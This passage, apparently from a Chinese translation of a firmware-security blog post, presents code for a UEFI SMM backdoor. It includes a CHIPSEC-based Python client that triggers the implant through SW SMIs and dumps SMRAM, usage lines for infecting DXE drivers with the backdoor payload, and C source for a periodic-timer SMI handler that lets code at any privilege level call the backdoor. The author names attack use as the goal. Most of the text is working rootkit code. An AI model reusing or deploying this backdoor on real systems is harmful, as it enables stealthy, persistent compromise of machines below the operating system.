class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cs.uefi.get_EFI_variable(name[<span class="number">0</span>], <span class="string">&#x27;-&#x27;</span>.join(name[<span class="number">1</span>:]), <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># helpers for EFI variables with numeric value</span></span><br><span class="line">efi_var_get_8 = <span class="keyword">lambda</span> name: unpack(<span class="string">&#x27;B&#x27;</span>, efi_var_get(name))[<span class="number">0</span>]</span><br><span class="line">efi_var_get_16 = <span class="keyword">lambda</span> name: unpack(<span class="string">&#x27;H&#x27;</span>, efi_var_get(name))[<span class="number">0</span>]</span><br><span class="line">efi_var_get_32 = <span class="keyword">lambda</span> name: unpack(<span class="string">&#x27;I&#x27;</span>, efi_var_get(name))[<span class="number">0</span>]</span><br><span class="line">efi_var_get_64 = <span class="keyword">lambda</span> name: unpack(<span class="string">&#x27;Q&#x27;</span>, efi_var_get(name))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mem_read</span>(<span class="params">addr, size</span>): </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cs.mem.read_phys_mem(addr, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># helpers to read numeric values from physical memory</span></span><br><span class="line">mem_read_8 = <span class="keyword">lambda</span> addr: unpack(<span class="string">&#x27;B&#x27;</span>, mem_read(addr, <span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line">mem_read_16 = <span class="keyword">lambda</span> addr: unpack(<span class="string">&#x27;H&#x27;</span>, mem_read(addr, <span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">mem_read_32 = <span class="keyword">lambda</span> addr: unpack(<span class="string">&#x27;I&#x27;</span>, mem_read(addr, <span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">mem_read_64 = <span class="keyword">lambda</span> addr: unpack(<span class="string">&#x27;Q&#x27;</span>, mem_read(addr, <span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_backdoor_info_addr</span>():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># BACKDOOR_INFO结构体物理内存的返回地址</span></span><br><span class="line">    <span class="keyword">return</span> efi_var_get_64(BACKDOOR_INFO_EFI_VAR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_backdoor_info</span>(<span class="params">addr = <span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    addr = get_backdoor_info_addr() <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回BACKDOOR_INFO结构体的字段值</span></span><br><span class="line">    <span class="keyword">return</span> unpack(BACKDOOR_INFO_FMT, mem_read(addr, BACKDOOR_INFO_LEN))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_backdoor_info_mem</span>(<span class="params">addr = <span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    addr = get_backdoor_info_addr() <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回BACKDOOR_INFO结构体的raw数据</span></span><br><span class="line">    <span class="keyword">return</span> mem_read(addr + PAGE_SIZE, PAGE_SIZE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_smram_info</span>():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ret = []  </span><br><span class="line">    backdoor_info = get_backdoor_info_addr()  </span><br><span class="line">    addr, size = backdoor_info + BACKDOOR_INFO_LEN, <span class="number">8</span> * <span class="number">4</span>    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># dump EFI_SMRAM_DESCRIPTOR结构体的数组</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            typedef struct _EFI_SMRAM_DESCRIPTOR </span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                EFI_PHYSICAL_ADDRESS PhysicalStart; </span></span><br><span class="line"><span class="string">                EFI_PHYSICAL_ADDRESS CpuStart; </span></span><br><span class="line"><span class="string">                UINT64 PhysicalSize; </span></span><br><span class="line"><span class="string">                UINT64 RegionState;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &#125; EFI_SMRAM_DESCRIPTOR;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>            </span><br><span class="line">        physical_start, cpu_start, physical_size, region_state = \</span><br><span class="line">            unpack(<span class="string">&#x27;Q&#x27;</span> * <span class="number">4</span>, mem_read(addr, size))            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> physical_start == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># no more items</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ret.append(( physical_start, physical_size, region_state ))</span><br><span class="line">        addr += size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_sw_smi</span>(<span class="params">command, data, arg</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成SW SMI:数据写入B2h端口，arg拷贝到RCX寄存器</span></span><br><span class="line">    cs.ints.send_SW_SMI(command, data, <span class="number">0</span>, <span class="number">0</span>, arg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_mem_page</span>(<span class="params">addr, count = <span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    backdoor_info = get_backdoor_info_addr()</span><br><span class="line">    count = <span class="number">1</span> <span class="keyword">if</span> count <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> count    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从addr开始dump指定数量的内存页</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送读取内存的命令到SMM代码</span></span><br><span class="line">        page_addr = addr + PAGE_SIZE * i</span><br><span class="line">        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从物理内存中读取被转储的页</span></span><br><span class="line">        _, last_status = get_backdoor_info(addr = backdoor_info)</span><br><span class="line">        <span class="keyword">if</span> last_status != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;SMM backdoor error 0x%.8x&#x27;</span> % last_status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ret += get_backdoor_info_mem(addr = backdoor_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_smram</span>():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        contents = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Dumping SMRAM regions, this may take a while...&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 枚举并转储可用的SMRAM区域</span></span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> get_smram_info():        </span><br><span class="line">            </span><br><span class="line">            region_addr, region_size, _ = region</span><br><span class="line">            name = <span class="string">&#x27;SMRAM_dump_%.8x_%.8x.bin&#x27;</span> % (region_addr, region_addr + region_size - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 转储区域内容       </span></span><br><span class="line">            data = dump_mem_page(region_addr, region_size / PAGE_SIZE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            contents.append(( name, data ))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存转储的数据到文件</span></span><br><span class="line">        <span class="keyword">for</span> name, data <span class="keyword">in</span> contents:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fd:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;[+] Creating&#x27;</span>, name</span><br><span class="line">                fd.write(data) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> IOError, why:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[!]&#x27;</span>, <span class="built_in">str</span>(why)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chipsec_init</span>():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> cs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># import CHIPSEC modules</span></span><br><span class="line">    <span class="keyword">import</span> chipsec.chipset</span><br><span class="line">    <span class="keyword">import</span> chipsec.hal.uefi</span><br><span class="line">    <span class="keyword">import</span> chipsec.hal.physmem</span><br><span class="line">    <span class="keyword">import</span> chipsec.hal.interrupts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># initialize helper</span></span><br><span class="line">    _cs = chipsec.chipset.cs()</span><br><span class="line">    _cs.init(<span class="literal">None</span>, <span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    cs = Chipsec(chipsec.hal.uefi.UEFI(_cs.helper),</span><br><span class="line">                 chipsec.hal.physmem.Memory(_cs.helper),</span><br><span class="line">                 chipsec.hal.interrupts.Interrupts(_cs))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    chipsec_init()</span><br><span class="line">    dump_smram()</span><br></pre></td></tr></table></figure>


<p>我实现了一个名为SmmBackdoor.py的脚本，它允许用后门代码感染已提取的DXE驱动程序，并使用SW SMI与已安装的后门程序交互。可用的命令如下：</p>
<ul>
<li><p><code>SmmBackdoor.py --infect &lt;source_path&gt; --output &lt;dest_path&gt; --payload SmmBackdoor.efi</code> —— 用后门代码感染DXE驱动程序的PE image</p>
</li>
<li><p><code>SmmBackdoor.py --test</code> —— 检查后门是否存在并从<code>BACKDOOR_INFO</code>结构体中打印状态信息。</p>
</li>
<li><p><code>SmmBackdoor.py --dump-smram</code> —— 将所有可用的SMRAM区域转储到文件中。</p>
</li>
<li><p><code>SmmBackdoor.py --read-phys &lt;address&gt;</code> —— 打印给定地址的物理内存页的十六进制转储。</p>
</li>
<li><p><code>SmmBackdoor.py --read-virt &lt;address&gt;</code> —— 打印给定地址的虚拟内存页的十六进制转储。</p>
</li>
</ul>
<p>使用示例——转储SMRAM中的CSEG和TSEG区域：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161830194.png" alt="image-20230809161830194"></p>
<p>你可能已经注意到SW SMI通信方法有一个严重的限制：我们需要作为root或Administator来触发SMI并访问物理内存。如果你打算利用这种后门进行研究或逆向工程，这没问题，但为了达到攻击的目的，我们需要找到一些更好的方法来调用后门代码，并适用于任何权限级别。</p>
<h2 id="使用APIC-timer与SMM进行通信"><a href="#使用APIC-timer与SMM进行通信" class="headerlink" title="使用APIC timer与SMM进行通信"></a>使用APIC timer与SMM进行通信</h2><p>发现可用的SMM子调度协议功能后，我认为<code>EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL</code>可以允许配置Advanced Programmable Interrupt Controller (APIC) timer并以指定的时间间隔来触发SMI，所以，可以实现以下通信方法：</p>
<ol>
<li>Non-SMM代码将带有magic常量的后门命令参数复制到CPU寄存器并进入死循环。</li>
<li>当用<code>EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL.Register()</code>函数注册的SMI timerhandler被调用时 —— 它会用magic常量检查保存的执行上下文中是否有寄存器值，如果有——它会执行指定的命令，并修改保存的指令的指针值，使non-SMM代码退出死循环。</li>
<li>后门也可以做虚拟地址到物理地址的转换，复制一些返回数据到缓冲区，通过non-SMM代码传递。</li>
</ol>
<p>此方法的客户端代码非常简单，不依赖于任何API或执行环境。它适用于任何权限级别——从沙箱用户模式程序到ring 0代码。<br>注册SMI timerhandler的后门代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// periodic timer 全局变量</span></span><br><span class="line">EFI_HANDLE m_PeriodicTimerDispatchHandle = <span class="literal">NULL</span>;</span><br><span class="line">EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *m_PeriodicTimerDispatch = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    SMM periodic timer注册上下文，包含Period和TickInterval值。</span></span><br><span class="line"><span class="comment">    阅读平台初始化规范第4卷中EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL </span></span><br><span class="line"><span class="comment">    的描述信息以获得更多关于它们的信息。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT m_PeriodicTimerDispatch2RegCtx = &#123; <span class="number">1000000</span>, <span class="number">640000</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    这个结构体保存CPU saved state中控制寄存器的值，</span></span><br><span class="line"><span class="comment">    这些值用于虚拟地址到物理地址的转换</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CONTROL_REGS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UINT64 Cr0, Cr3, Cr4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; CONTROL_REGS,</span><br><span class="line">*PCONTROL_REGS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个宏从CPU execution state中保存的SMRAM中读取寄存器值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_SAVE_STATE(_id_, _var_)                                                \</span></span><br><span class="line"><span class="meta">                                                                                    \</span></span><br><span class="line"><span class="meta">    Status = SmmCpu-&gt;ReadSaveState(SmmCpu,                                          \</span></span><br><span class="line"><span class="meta">        sizeof((_var_)), (_id_), gSmst-&gt;CurrentlyExecutingCpu, (PVOID)&amp;(_var_));    \</span></span><br><span class="line"><span class="meta">                                                                                    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (EFI_ERROR(Status))                                                          \</span></span><br><span class="line"><span class="meta">    &#123;                                                                               \</span></span><br><span class="line"><span class="meta">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;ReadSaveState() fails: 0x%X\r\n&quot;</span>, Status);      \</span></span><br><span class="line"><span class="meta">        goto _end;                                                                  \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个宏用于修改CPU  execution state的寄存器值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_SAVE_STATE(_id_, _var_, _val_)                                        \</span></span><br><span class="line"><span class="meta">                                                                                    \</span></span><br><span class="line"><span class="meta">    (_var_) = (UINT64)(_val_);                                                      \</span></span><br><span class="line"><span class="meta">    Status = SmmCpu-&gt;WriteSaveState(SmmCpu,                                         \</span></span><br><span class="line"><span class="meta">        sizeof((_var_)), (_id_), gSmst-&gt;CurrentlyExecutingCpu, (PVOID)&amp;(_var_));    \</span></span><br><span class="line"><span class="meta">                                                                                    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (EFI_ERROR(Status))                                                          \</span></span><br><span class="line"><span class="meta">    &#123;                                                                               \</span></span><br><span class="line"><span class="meta">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;WriteSaveState() fails: 0x%X\r\n&quot;</span>, Status);     \</span></span><br><span class="line"><span class="meta">        goto _end;                                                                  \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_JUMP_SIZE 6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EFI_STATUS EFIAPI <span class="title function_">PeriodicTimerDispatch2Handler</span><span class="params">(</span></span><br><span class="line"><span class="params">    EFI_HANDLE DispatchHandle, CONST VOID *Context,</span></span><br><span class="line"><span class="params">    VOID *CommBuffer, UINTN *CommBufferSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_STATUS Status = EFI_SUCCESS;   </span><br><span class="line">    EFI_SMM_CPU_PROTOCOL *SmmCpu = <span class="literal">NULL</span>;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取SMM CPU协议</span></span><br><span class="line">    Status = gSmst-&gt;SmmLocateProtocol(&amp;gEfiSmmCpuProtocolGuid, <span class="literal">NULL</span>, (PVOID *)&amp;SmmCpu);</span><br><span class="line">    <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        CONTROL_REGS ControlRegs;</span><br><span class="line">        UINT64 Rax = <span class="number">0</span>, Rcx = <span class="number">0</span>, Rdx = <span class="number">0</span>, Rdi = <span class="number">0</span>, Rsi = <span class="number">0</span>, R8 = <span class="number">0</span>, R9 = <span class="number">0</span>;        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR0, ControlRegs.Cr0);</span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR3, ControlRegs.Cr3);</span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR4, ControlRegs.Cr4);</span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RCX, Rcx); <span class="comment">// user-mode instruction pointer</span></span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RDI, Rdi); <span class="comment">// 1-st param (code)</span></span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RSI, Rsi); <span class="comment">// 2-nd param (arg1)</span></span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RDX, Rdx); <span class="comment">// 3-rd param (arg2)</span></span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_R8, R8); <span class="comment">// 1-st magic constant</span></span><br><span class="line">        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_R9, R9); <span class="comment">// 2-nd magic constant       </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">            检查在smm_call()中设置的magic值，</span></span><br><span class="line"><span class="comment">            查看 smm_call/smm_call.asm 以获取更多信息</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (R8 == BACKDOOR_SMM_CALL_R8_VAL &amp;&amp; R9 == BACKDOOR_SMM_CALL_R9_VAL)</span><br><span class="line">        &#123;            </span><br><span class="line">            DbgMsg(</span><br><span class="line">                __FILE__, __LINE__, </span><br><span class="line">                <span class="string">&quot;smm_call(): CPU #%d, RDI = 0x%llx, RSI = 0x%llx, RDX = 0x%llx\r\n&quot;</span>, </span><br><span class="line">                gSmst-&gt;CurrentlyExecutingCpu, Rdi, Rsi, Rdx</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 处理后门控制请求</span></span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置smm_call()的返回值</span></span><br><span class="line">            WRITE_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RAX, Rax, Status);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 让代码退出死循环</span></span><br><span class="line">            WRITE_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RCX, Rcx, Rcx - MAX_JUMP_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;LocateProtocol() fails: 0x%X\r\n&quot;</span>, Status);   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_end:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">EFI_STATUS <span class="title function_">PeriodicTimerDispatch2Register</span><span class="params">(EFI_HANDLE *DispatchHandle)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_STATUS Status = EFI_INVALID_PARAMETER;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m_PeriodicTimerDispatch)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 注册periodic timer例程</span></span><br><span class="line">        Status = m_PeriodicTimerDispatch-&gt;Register(</span><br><span class="line">            m_PeriodicTimerDispatch, </span><br><span class="line">            PeriodicTimerDispatch2Handler, </span><br><span class="line">            &amp;m_PeriodicTimerDispatch2RegCtx,</span><br><span class="line">            DispatchHandle</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">        &#123;</span><br><span class="line">            DbgMsg(</span><br><span class="line">                __FILE__, __LINE__, <span class="string">&quot;SMM timer handler is at &quot;</span>FPTR<span class="string">&quot;\r\n&quot;</span>, </span><br><span class="line">                PeriodicTimerDispatch2Handler</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            DbgMsg(__FILE__, __LINE__, <span class="string">&quot;Register() fails: 0x%X\r\n&quot;</span>, Status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">EFI_STATUS <span class="title function_">PeriodicTimerDispatch2Unregister</span><span class="params">(EFI_HANDLE DispatchHandle)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_STATUS Status = EFI_INVALID_PARAMETER;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m_PeriodicTimerDispatch)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 卸载 periodic timer例程</span></span><br><span class="line">        Status = m_PeriodicTimerDispatch-&gt;UnRegister(</span><br><span class="line">            m_PeriodicTimerDispatch, </span><br><span class="line">            DispatchHandle</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">        &#123;</span><br><span class="line">            DbgMsg(__FILE__, __LINE__, <span class="string">&quot;SMM timer handler unregistered\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            DbgMsg(__FILE__, __LINE__, <span class="string">&quot;Unregister() fails: 0x%X\r\n&quot;</span>, 